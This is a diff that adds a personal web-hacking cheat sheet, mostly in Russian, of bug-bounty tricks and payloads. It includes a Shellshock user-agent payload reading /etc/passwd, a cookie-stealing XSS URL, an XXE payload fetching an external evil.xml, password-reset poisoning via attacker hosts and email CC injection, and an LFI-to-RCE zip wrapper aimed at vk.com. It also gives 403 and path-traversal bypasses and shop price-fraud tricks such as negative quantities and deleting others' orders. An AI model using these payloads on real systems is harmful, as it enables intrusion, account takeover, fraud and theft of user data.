@@ -1,0 +1,143 @@
+типсы
+
+
+%2e
+%00
+%20
+%09
+%0d%0a
+%0c
+%0`
+
+
+vk,com/ /insta.php
+
+
+second content fuzzing
+/..%2f
+/..;/
+/../
+/..%00/
+/..%0d/
+/..%5c
+/..\
+/..%ff/
+/%2e%2e%2f
+/.%2e/
+/%3f (?)
+/%26 (&)
+/%23 (#)
+
+
+
+
+https://github.com/gwen001/pentest-tools супер полезная репозитория
+общие
+ 1. Add %23 (#) or %2523 / %23%32%35 (double encoded) to the end of parameter values and see what happens. If the value is used in a backend API call it might cause an error that you can take advantage of for SSRF.
+ 2. -Request Smuggling для robots.txt пробовать первым
+ 3.пробовать добавить %2е после первого слэша для обхода 403 ошибки
+ 4.evil.com is blocked?   e.g http://target.com try http://target.computer   e.g http://target.net try http://target.network
+ 5.пробовать добавить id друогого человека в разных запросах в том числе к API
+ 6. Нахождение виртуальных серверов на поддоменах или админ панели  ffuf -c -u https://target .com -H “Host: FUZZ” -w vhost_wordlist.txt
+ 7.Github search for `vim_settings.xml` which contains copy-pasted strings encoded in Base64 and more...
+ 8.использовать айди ггул аналитики для рекона
+ 9.когда вставляю пейлоад в location header добавлять /? в конце ----location://attacer.com/&-foobar
+10.ssrf поменять http с 1.1 yf 0.9 и удалить хост хедер
+11.работает с CDN  ---добавлять к коцу урла ?AWSAccessKeyId=[Valid_ACCESS_KEY_ID]&Expires=1766972005&Signature=ccc чтобы получить aws ключ
+12.пробовать добавлять к концу урла / или /.или //или /./
+13 cgi ----- cgi-bin/status  поменять юзер агента на               { :;}; echo $(</etc/passwd)
+14.смотреть репорты об разных уязвимостях , искать похожие директории на других сайтах связанный с уязвимым через--- nslookup vk.com
+15.cкрапить js на все имена переменных и пробовать их как параметры в урле для xss
+16.добавлять /* к концу урла для байпасса 404
+17.Created dork: inurl:"/plugins/servlet/Wallboard/"   ----EP:/?dashboardId=10102&dashboardId=10103&cyclePeriod=(function(){alert(document.cookie);return%2030000;})()&transitionFx=fadeZoom&random=false
+18.head method такой эе как гет методы
+19.для обхода 403 пробовать добавлять хэдер X-Original-URL: /admin/deleteUser -> 200OK или X-Rewrite-Url  X-Forwarded-Url    X-Forwarded-Path
+20.
+
+
+
+
+CDN
+1.добавлять к коцу урла ?AWSAccessKeyId=[Valid_ACCESS_KEY_ID]&Expires=1766972005&Signature=ccc чтобы получить aws ключ
+
+
+
+
+
+xss
+1.если внутри атрибута src= пробовать оборачивать (https)  в скобки круглые
+
+
+
+
+drupal
+1.fuzz with intruder on '/node/$' where '$' is a number (from 1 to 500 for example).
+2.
+
+
+
+
+
+
+ xxe
+ 1.http://opencms.tld/opencms/opencms/handleSolrSelect?fq={!xmlparser%20v=%27<!DOCTYPE+a+[<!ENTITY+\u0025+asd+SYSTEM+"http://dom.foo:8080/evil.xml">\u0025asd%3b\u0025c%3b]><a>%26rrr%3b</a>%27}
+
+
+
+
+
+node.js
+
+1. добавлять к домену %ff иногда вызывает ошибку с полным путем
+
+
+
+
+
+Ценовой хакинг магазинов
+1.добавить гарантию, сделать значение гаранитии  в запросе отрицательной
+2.отрицательное значение колличества продуктов
+3.пробовать поменять метод на delete чтобы удалять заказы других людей
+4.пробовать 0.1 товара вместо 1
+5.если цена завязана на количестве символов меняыть 999$ на 001$
+6.добавить два товара, один сделать с большим количеством для уравновешивания а второй который дороже сделать в количестве -2 items:{laptop:4,mobile:-2} 4x40-2x80=0
+
+
+
+
+формы регистрации/входа/полей
+1. попроьовать круглые скобки , запихнуть в них XSS jnvjerg(3673366|"")@mail.ru
+2.запихнуть свой эмейл как второй параметр к другому эмейлу, чтобы полукчить линк восстановления на почту
+ps. пробовать такую абфускацию email="victim@mail.tld%0a%0dcc:attacker@mail.tld"
+ps2 если   JSON array: {"email":["victim@mail.tld","atracker@mail.tld"]}
+3.брут токена восстоновления
+4.пробовать свой токен восстановления на другом аккаунте
+5.пробовать смени ть хост хедер на свой сайт,, жертва может получить ссылку восстановления с нашим хостом а не ориг сайт
+6.пробовать понять как токен генерируется
+7.Race condition
+8.SSTI on host header
+9.CBC attack
+10.Сессия не заканчивается после смены пороля
+11.Токен не просрачивается после использования восстановления
+12.X-Forwarded_host: evil.xom
+13.null/nil value вместо токена
+14.пробовать зарегать один эмейл на разных TLD .eu .ru.fr
+15.разные методы put post target
+16.super long string
+17. Ngrok добавить хэдер в резет линку, после перехода получить токен в Ngrok
+18.нас странице регистрации вводить уже реганый мейл  и нажимать логин. в запросе менять логин-метод на какой-нбудь чтобы получить успешную формую следить за куками обновить страницу и снова смотреть кукию могут появляться валидные.
+19.try to ask reset password for victim@example-com to victim@exàmple-com , if the backend is vulnerable it will be sent to xn--bl-mple-com instead of example-com
+20.in reset password functionality if the host header bug work try to inject SSTI payload ${{7*7}} on X-Forwarded-Host  for more impact .
+21.-victim has email as victim+@gmail.com      -i signed up with victimU+0020@gmail.com
+22.пробовать регать два акка включать 2фа на обоих потом выключать на одном и ловить запрос с CSRF токеном и пробовать юзать его для другого аккаунт
+23. IDN homograph атаки пробовать на эмейлы итд
+24.
+
+
+
+
+
+
+LFI
+1.если можно загружать zip . сделать rce.php зипануть его и загрузить , а тригирить через http://vk.com/uploads.php?page=zip://path/file.zip%23rce.php
+2.
